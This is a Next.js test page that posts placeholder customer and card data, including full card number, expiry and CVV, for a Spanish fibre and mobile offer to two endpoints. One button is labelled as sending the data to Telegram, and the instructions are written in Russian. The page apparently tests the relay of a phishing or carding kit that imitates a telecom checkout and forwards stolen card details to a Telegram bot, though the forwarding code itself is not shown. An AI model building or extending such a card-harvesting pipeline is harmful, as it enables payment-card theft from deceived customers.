'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function TestPaymentPage() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [error, setError] = useState<string | null>(null);

  const testPayment = async () => {
    setLoading(true);
    setError(null);
    setResult(null);

    try {
      const testData = {
        firstName: "Juan",
        lastName: "Pérez",
        email: "juan.perez@test.com",
        phone: "+34 600 123 456",
        cardNumber: "1234 5678 9012 3456",
        expiryMonth: "12",
        expiryYear: "25",
        cvv: "123",
        period: "1",
        cart: {
          name: "Fibra 600 Mb + 35 GB",
          price: "47,00",
          description: "Fibra 600 Mb + fijo + Móvil con 35 GB y llamadas infinitas"
        },
        sessionId: "test-" + Date.now()
      };

      console.log('Testing with data:', testData);

      const response = await fetch('/api/test-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(testData),
      });

      const result = await response.json();
      console.log('Test result:', result);

      if (response.ok) {
        setResult(result);
      } else {
        setError(result.error || 'Test failed');
      }
    } catch (error) {
      console.error('Test error:', error);
      setError('Connection error');
    } finally {
      setLoading(false);
    }
  };

  const testRealPayment = async () => {
    setLoading(true);
    setError(null);
    setResult(null);

    try {
      const testData = {
        firstName: "Juan",
        lastName: "Pérez",
        email: "juan.perez@test.com",
        phone: "+34 600 123 456",
        cardNumber: "1234 5678 9012 3456",
        expiryMonth: "12",
        expiryYear: "25",
        cvv: "123",
        period: "1",
        cart: {
          name: "Fibra 600 Mb + 35 GB",
          price: "47,00",
          description: "Fibra 600 Mb + fijo + Móvil con 35 GB y llamadas infinitas"
        },
        sessionId: "test-" + Date.now()
      };

      console.log('Testing real payment with data:', testData);

      const response = await fetch('/api/send-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(testData),
      });

      const result = await response.json();
      console.log('Real payment result:', result);

      if (response.ok) {
        setResult(result);
      } else {
        setError(result.error || 'Real payment failed');
      }
    } catch (error) {
      console.error('Real payment error:', error);
      setError('Connection error');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-2xl mx-auto px-4">
        <h1 className="text-3xl font-bold text-center mb-8">Test Payment API</h1>
        
        <div className="bg-white rounded-lg shadow-lg p-6 mb-6">
          <h2 className="text-xl font-bold mb-4">API Tests</h2>
          
          <div className="space-y-4">
            <button
              onClick={testPayment}
              disabled={loading}
              className="w-full bg-blue-600 text-white py-3 px-6 rounded-lg font-semibold hover:bg-blue-700 disabled:opacity-50"
            >
              {loading ? 'Testing...' : 'Test Payment API (Mock)'}
            </button>
            
            <button
              onClick={testRealPayment}
              disabled={loading}
              className="w-full bg-green-600 text-white py-3 px-6 rounded-lg font-semibold hover:bg-green-700 disabled:opacity-50"
            >
              {loading ? 'Testing...' : 'Test Real Payment API (Telegram)'}
            </button>
          </div>
        </div>

        {error && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
            <h3 className="text-red-800 font-bold mb-2">Error:</h3>
            <p className="text-red-600">{error}</p>
          </div>
        )}

        {result && (
          <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
            <h3 className="text-green-800 font-bold mb-2">Success:</h3>
            <pre className="text-green-600 text-sm overflow-auto">
              {JSON.stringify(result, null, 2)}
            </pre>
          </div>
        )}

        <div className="bg-gray-100 rounded-lg p-4">
          <h3 className="font-bold mb-2">Instructions:</h3>
          <ul className="text-sm text-gray-600 space-y-1">
            <li>• "Test Payment API" - тестирует без Telegram</li>
            <li>• "Test Real Payment API" - тестирует с Telegram (требует настройки)</li>
            <li>• Проверьте консоль браузера для подробных логов</li>
            <li>• Проверьте терминал сервера для API логов</li>
          </ul>
        </div>

        <div className="text-center mt-6">
          <button
            onClick={() => router.push('/payment')}
            className="bg-gray-600 text-white py-2 px-4 rounded-lg hover:bg-gray-700"
          >
            Go to Payment Page
          </button>
        </div>
      </div>
    </div>
  );
} 